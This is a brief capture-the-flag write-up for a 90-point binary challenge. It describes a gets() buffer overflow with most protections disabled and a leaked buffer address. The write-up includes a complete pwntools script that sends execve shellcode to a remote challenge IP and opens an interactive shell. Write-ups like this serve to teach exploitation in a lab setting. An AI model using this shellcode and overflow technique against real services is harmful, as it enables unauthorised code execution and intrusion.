Most of the binary challenges from the CTF were easy, based of basic `BOF` and basic `ROP`.

She sells sea shells â€“ 90 points

Analyzing the binary we find a gets function which is vulnerable. Going through checksec everything other than `RELRO (partial)` is disabled. Also the `ASLR` is turned on.

No worries the program itself prints the address of the buffer each time we run the program.

Nothing much to do inject some shell code and then make the return address point to the shellcode.

### Python code:

```python
from pwn import *
p=remote('139.59.30.165',8900)
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.recvuntil(") ")
a=int(p.recvline(),16)
d=p64(a)
l=len(shellcode)
second=shellcode+"A"*(72-l)+d
p.sendline(second)
p.interactive()
```

That is it. Use cat to print the flag.
